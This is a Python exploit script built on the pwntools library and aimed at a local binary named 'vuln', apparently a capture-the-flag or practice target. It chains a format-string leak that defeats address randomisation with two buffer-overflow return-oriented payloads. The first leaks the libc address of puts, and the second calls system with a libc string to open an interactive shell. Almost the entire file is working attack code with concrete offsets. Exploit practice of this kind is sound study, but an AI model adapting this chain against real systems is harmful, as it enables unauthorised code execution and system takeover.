from pwn import *


context(os = "linux", arch = "amd64")
# bin = context.binary = ELF("./test")
vul = process("./vuln")

'''Part 1 to find the base address of the text section'''
# format_string = b"AAAAAAAA|" + b"%lx|" * 39     #will be run to get idea where the address resides.. 
# vul.sendline(format_string)
# print(vul.recvline()) 

offset_base_text = 0x1080 #this will be set accordingly..
vul.sendline(b"%33$lx")
leaked_address = vul.recvline()
leaked_address = int(str(leaked_address).split(' ')[3][:-3], 16)
actual_address = leaked_address - offset_base_text
log.success("Text section base address is leaked " + hex(leaked_address))
log.success("Actual text section address is " + hex(actual_address))

'''Part 2 we will leak the address of puts or printf whatever is available'''
puts_plt = 0x1040 + actual_address
puts_got = 0x3fc0 + actual_address
pop_rdi = 0x128b + actual_address
start = 0x1080 + actual_address
ret = 0x1016 + actual_address
junk = b'A' * 216
payload = junk + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)
vul.sendline(payload)

vul.recvline(b'\x0a')
print(vul.recvline())

puts_actual = 0x71e30
puts_leaked = u64(vul.recvline().strip().ljust(8, b'\00'))
offset_libc = puts_leaked - puts_actual
log.success("Puts address leaked " + hex(puts_leaked))
log.success("Libc actuall base address " + hex(offset_libc))
system = 0x45880 + offset_libc
args = 0x194882 + offset_libc
junk = b'A' * 40
payload = junk + p64(pop_rdi) + p64(args) + p64(system)
vul.sendline(payload)
vul.interactive()